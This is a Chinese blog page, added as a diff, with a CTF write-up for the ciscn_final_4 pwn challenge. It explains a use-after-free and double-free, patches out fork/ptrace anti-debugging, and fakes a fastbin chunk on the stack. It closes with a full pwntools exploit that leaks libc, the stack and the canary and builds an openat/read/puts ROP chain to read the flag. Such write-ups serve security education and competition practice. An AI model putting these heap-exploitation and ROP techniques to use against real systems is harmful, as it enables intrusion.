@@ -1,0 +1,542 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/ha1vk/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/ha1vk/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/ha1vk/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/ha1vk/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/ha1vk/css/main.css">
+
+
+<link rel="stylesheet" href="/ha1vk/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"github.com","root":"/ha1vk/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="首先，检查一下程序的保护机制，没开PIE   沙箱禁用了execve，因此不能getshell，只能构造ROP来读取flag   然后，我们用IDA分析一下">
+<meta property="og:type" content="article">
+<meta property="og:title" content="反调试+在栈上伪造堆chunk">
+<meta property="og:url" content="https://github.com/ha1vk/2020/04/30/ciscn_final_4/index.html">
+<meta property="og:site_name" content="ha1vk&#39;s blog">
+<meta property="og:description" content="首先，检查一下程序的保护机制，没开PIE   沙箱禁用了execve，因此不能getshell，只能构造ROP来读取flag   然后，我们用IDA分析一下">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://github.com/ha1vk/2020/04/30/ciscn_final_4/image1.png">
+<meta property="og:image" content="https://github.com/ha1vk/2020/04/30/ciscn_final_4/image2.png">
+<meta property="og:image" content="https://github.com/ha1vk/2020/04/30/ciscn_final_4/image3.png">
+<meta property="og:image" content="https://github.com/ha1vk/2020/04/30/ciscn_final_4/image4.png">
+<meta property="og:image" content="https://github.com/ha1vk/2020/04/30/ciscn_final_4/image5.png">
+<meta property="og:image" content="https://github.com/ha1vk/2020/04/30/ciscn_final_4/image6.png">
+<meta property="og:image" content="https://github.com/ha1vk/2020/04/30/ciscn_final_4/image7.png">
+<meta property="og:image" content="https://github.com/ha1vk/2020/04/30/ciscn_final_4/image8.png">
+<meta property="og:image" content="https://github.com/ha1vk/2020/04/30/ciscn_final_4/image9.png">
+<meta property="og:image" content="https://github.com/ha1vk/2020/04/30/ciscn_final_4/image10.png">
+<meta property="og:image" content="https://github.com/ha1vk/2020/04/30/ciscn_final_4/image11.png">
+<meta property="og:image" content="https://github.com/ha1vk/2020/04/30/ciscn_final_4/image12.png">
+<meta property="og:image" content="https://github.com/ha1vk/2020/04/30/ciscn_final_4/image13.png">
+<meta property="og:image" content="https://github.com/ha1vk/2020/04/30/ciscn_final_4/image14.png">
+<meta property="article:published_time" content="2020-04-30T01:58:11.000Z">
+<meta property="article:modified_time" content="2025-06-25T09:19:15.738Z">
+<meta property="article:author" content="ha1vk">
+<meta property="article:tag" content="UAF">
+<meta property="article:tag" content="fastbin">
+<meta property="article:tag" content="反调试">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/ha1vk/2020/04/30/ciscn_final_4/image1.png">
+
+<link rel="canonical" href="https://github.com/ha1vk/2020/04/30/ciscn_final_4/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>反调试+在栈上伪造堆chunk | ha1vk's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/ha1vk/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">ha1vk's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/ha1vk/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/ha1vk/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/ha1vk/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/ha1vk/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/ha1vk/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/ha1vk/2020/04/30/ciscn_final_4/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/ha1vk/images/avatar.gif">
+      <meta itemprop="name" content="ha1vk">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ha1vk's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          反调试+在栈上伪造堆chunk
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-04-30 09:58:11" itemprop="dateCreated datePublished" datetime="2020-04-30T09:58:11+08:00">2020-04-30</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-06-25 17:19:15" itemprop="dateModified" datetime="2025-06-25T17:19:15+08:00">2025-06-25</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/ha1vk/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>首先，检查一下程序的保护机制，没开PIE</p>
+<img src="/ha1vk/2020/04/30/ciscn_final_4/image1.png" class="">
+
+<p>沙箱禁用了execve，因此不能getshell，只能构造ROP来读取flag</p>
+<img src="/ha1vk/2020/04/30/ciscn_final_4/image2.png" class="">
+
+<p>然后，我们用IDA分析一下</p>
+<p>Delete功能没有清空堆指针，存在UAF可以造成double free</p>
+<img src="/ha1vk/2020/04/30/ciscn_final_4/image3.png" class="">
+
+<p>new功能可以自由控制大小</p>
+<img src="/ha1vk/2020/04/30/ciscn_final_4/image4.png" class="">
+
+<p>程序一开始，我们可以在栈里输入一些数据，因此，我们可以在栈里伪造一个chunk，然后利用fastbin attack申请堆到栈上，这样，我们就能控制栈了。</p>
+<img src="/ha1vk/2020/04/30/ciscn_final_4/image5.png" class="">
+
+<p>我们不能接触main函数返回，因为main函数里是一个死循环，我们可以劫持其他函数。</p>
+<img src="/ha1vk/2020/04/30/ciscn_final_4/image6.png" class="">
+
+<p>Fastbin attack劫持new函数时，我们可以利用栈上已有的数据，来伪造size，从而绕过fastbin 分配时的size检查。</p>
+<p>另外，程序一开始，fork了子进程，然后利用了ptrace，导致我们无法调试它的子进程</p>
+<img src="/ha1vk/2020/04/30/ciscn_final_4/image7.png" class="">
+
+<img src="/ha1vk/2020/04/30/ciscn_final_4/image8.png" class="">
+
+<p>因此，我们需要先反调试，一个好的方法是将这里指令修改为jmp，跳过后面的fork、ptrace等操作。</p>
+<img src="/ha1vk/2020/04/30/ciscn_final_4/image9.png" class="">
+
+<p>我们要跳到这里</p>
+<img src="/ha1vk/2020/04/30/ciscn_final_4/image10.png" class="">
+
+<p>总共的距离为0x000000000040102F-0x0000000000400F91 &#x3D; 0x9E，因此，我们可以修改call fork指令为jmp $+0x9E，如何知道这条指令的值？我们可以利用pwntools。</p>
+<img src="/ha1vk/2020/04/30/ciscn_final_4/image11.png" class="">
+
+<p>然后，我们利用十六进制编辑器，修改call fork处的指令</p>
+<img src="/ha1vk/2020/04/30/ciscn_final_4/image12.png" class="">
+
+<p>重新打开IDA，发现fork等操作已经不见了</p>
+<img src="/ha1vk/2020/04/30/ciscn_final_4/image13.png" class="">
+
+<p>那么，我们就可以继续来调试了，在new的rbp上方附近，有一个0x40的数据，利用错位，可以伪造成0x40的fastbin的size，从而，我们可以通过malloc(0x30)来申请到此处，进而控制该函数的执行流。但是0x30的大小，我们仅能写一两个rop指令，一个好的方法是利用add rsp,xx，来将栈迁移到下方我们可控的大空间里执行后续rop。</p>
+<img src="/ha1vk/2020/04/30/ciscn_final_4/image14.png" class="">
+
+<p>综上，完整exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28016</span>)</span><br><span class="line"><span class="comment">#sh = process(&#x27;./ciscn_final_4&#x27;)</span></span><br><span class="line"><span class="comment">#sh = process(&#x27;./test&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;</span>)</span><br><span class="line">malloc_hook_s = libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">environ_s = libc.symbols[<span class="string">&#x27;__environ&#x27;</span>]</span><br><span class="line"></span><br><span class="line">fake_chunk = p64(<span class="number">0</span>) + p64(<span class="number">0x81</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0xE8</span> + fake_chunk</span><br><span class="line"></span><br><span class="line">sh.sendafter(<span class="string">&#x27;what is your name?&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;size?&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">   sh.sendafter(<span class="string">&#x27;content?&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;index ?&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;index ?&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line"><span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x78</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x78</span>)</span><br><span class="line"><span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x78</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x78</span>)</span><br><span class="line"><span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0x38</span>)</span><br><span class="line"><span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">0x38</span>)</span><br><span class="line"><span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x81</span>,<span class="string">&#x27;f&#x27;</span>*<span class="number">0x81</span>)</span><br><span class="line"><span class="comment">#heap_size数组的0x81数据用于伪造chunk的size</span></span><br><span class="line">heapsize6_addr = <span class="number">0x0000000000602058</span></span><br><span class="line">note_addr = <span class="number">0x00000000006020C0</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">main_arena_88 = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">malloc_hook_addr = (main_arena_88 &amp; <span class="number">0xFFFFFFFFFFFFF000</span>) + (malloc_hook_s &amp; <span class="number">0xFFF</span>)</span><br><span class="line">libc_base = malloc_hook_addr - malloc_hook_s</span><br><span class="line">environ_addr = libc_base + environ_s</span><br><span class="line">pop_rdi = libc_base + <span class="number">0x0000000000021102</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x00000000000202e8</span></span><br><span class="line">pop_rdx = libc_base + <span class="number">0x0000000000001b92</span></span><br><span class="line"><span class="comment">#add rsp, 0x148 ; ret</span></span><br><span class="line">add_rsp_148 = libc_base + <span class="number">0x00000000000353aa</span></span><br><span class="line">openat_addr = libc_base + libc.sym[<span class="string">&#x27;openat&#x27;</span>]</span><br><span class="line">read_addr = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">puts_addr = libc_base + libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;libc_base=&#x27;</span>,<span class="built_in">hex</span>(libc_base)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;environ_addr=&#x27;</span>,<span class="built_in">hex</span>(environ_addr)</span><br><span class="line"><span class="comment">#double free</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x78</span>,p64(heapsize6_addr - <span class="number">0x8</span>)) <span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x78</span>,<span class="string">&#x27;c&#x27;</span>) <span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x78</span>,<span class="string">&#x27;a&#x27;</span>) <span class="comment">#9</span></span><br><span class="line"><span class="comment">#控制notesize以及note数组</span></span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x60</span></span><br><span class="line">payload += p64(environ_addr) <span class="comment">#ptr0</span></span><br><span class="line">add(<span class="number">0x78</span>,payload) <span class="comment">#10</span></span><br><span class="line"><span class="comment">#泄露栈地址</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">stack_addr = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;stack_addr=&#x27;</span>,<span class="built_in">hex</span>(stack_addr)</span><br><span class="line">fake_chunk_stack_addr = stack_addr - <span class="number">0x120</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;fake_chunk_stack_addr=&#x27;</span>,<span class="built_in">hex</span>(fake_chunk_stack_addr)</span><br><span class="line"><span class="comment">#利用同样的方法分配到栈上伪造的chunk</span></span><br><span class="line"><span class="comment">#double free</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x78</span>,p64(fake_chunk_stack_addr)) <span class="comment">#11</span></span><br><span class="line">add(<span class="number">0x78</span>,<span class="string">&#x27;c&#x27;</span>) <span class="comment">#12</span></span><br><span class="line">add(<span class="number">0x78</span>,<span class="string">&#x27;a&#x27;</span>) <span class="comment">#13</span></span><br><span class="line"><span class="comment">#写栈</span></span><br><span class="line">add(<span class="number">0x78</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0x11</span>) <span class="comment">#14</span></span><br><span class="line"><span class="comment">#泄露canary</span></span><br><span class="line">show(<span class="number">14</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;d&#x27;</span>*<span class="number">0x11</span>)</span><br><span class="line">canary = u64(sh.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;canary=&#x27;</span>,<span class="built_in">hex</span>(canary)</span><br><span class="line"><span class="comment">#重新分配到fake_chunk_stack_addr，布置rop</span></span><br><span class="line"><span class="comment">#double free</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x78</span>,p64(fake_chunk_stack_addr)) <span class="comment">#15</span></span><br><span class="line">add(<span class="number">0x78</span>,<span class="string">&#x27;c&#x27;</span>) <span class="comment">#16</span></span><br><span class="line">add(<span class="number">0x78</span>,<span class="string">&#x27;a&#x27;</span>) <span class="comment">#17</span></span><br><span class="line"><span class="comment">#由于长度不够输入，我们调用read继续输入rop</span></span><br><span class="line">next_rop_addr = fake_chunk_stack_addr + <span class="number">0x88</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span></span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0</span>) + p64(pop_rsi) + p64(next_rop_addr) + p64(pop_rdx) + p64(<span class="number">0x1000</span>) + p64(read_addr)</span><br><span class="line">add(<span class="number">0x78</span>,payload) <span class="comment">#18</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#由于无法触发main函数rop，因为有一个死循环，所以我们劫持new函数来rop到main后面</span></span><br><span class="line"><span class="comment">#接下来，分配到new函数的栈末尾处</span></span><br><span class="line">fake_chunk_stack_addr2 = stack_addr - <span class="number">0x246</span></span><br><span class="line"><span class="comment">#double free</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x38</span>,p64(fake_chunk_stack_addr2)) <span class="comment">#15</span></span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">&#x27;c&#x27;</span>) <span class="comment">#16</span></span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">&#x27;a&#x27;</span>) <span class="comment">#17</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;d&#x27;</span>*<span class="number">0x6</span> + p64(canary) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(add_rsp_148) <span class="comment">#跳到main函数后面的rop里</span></span><br><span class="line"><span class="comment">#new函数返回到add_rsp_148进而跳到main后面的rop里</span></span><br><span class="line">add(<span class="number">0x38</span>,payload)</span><br><span class="line"></span><br><span class="line">flag_addr = next_rop_addr + <span class="number">0x88</span></span><br><span class="line"><span class="comment">#openat(0,flag_addr,0)</span></span><br><span class="line">rop = p64(pop_rdi) + p64(<span class="number">0</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdi) + p64(<span class="number">0</span>) + p64(openat_addr)</span><br><span class="line"><span class="comment">#read(fd,flag_addr,0x30)</span></span><br><span class="line">rop += p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(<span class="number">0x30</span>) + p64(read_addr)</span><br><span class="line"><span class="comment">#puts(flag_addr)</span></span><br><span class="line">rop += p64(pop_rdi) + p64(flag_addr) + p64(puts_addr)</span><br><span class="line">rop += <span class="string">&#x27;/flag\x00&#x27;</span></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">sh.send(rop)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/ha1vk/tags/UAF/" rel="tag"># UAF</a>
+              <a href="/ha1vk/tags/fastbin/" rel="tag"># fastbin</a>
+              <a href="/ha1vk/tags/%E5%8F%8D%E8%B0%83%E8%AF%95/" rel="tag"># 反调试</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/ha1vk/2020/04/17/roarctf_2019_easyheap/" rel="prev" title="roarctf_2019_easyheap(文件描述符1关闭后仍然可以交互)">
+      <i class="fa fa-chevron-left"></i> roarctf_2019_easyheap(文件描述符1关闭后仍然可以交互)
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/ha1vk/2020/04/30/huxiangbei_2019_namesystem/" rel="next" title="huxiangbei_2019_namesystem">
+      huxiangbei_2019_namesystem <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ha1vk</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/ha1vk/archives/">
+        
+          <span class="site-state-item-count">233</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/ha1vk/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/ha1vk/tags/">
+          
+        <span class="site-state-item-count">145</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
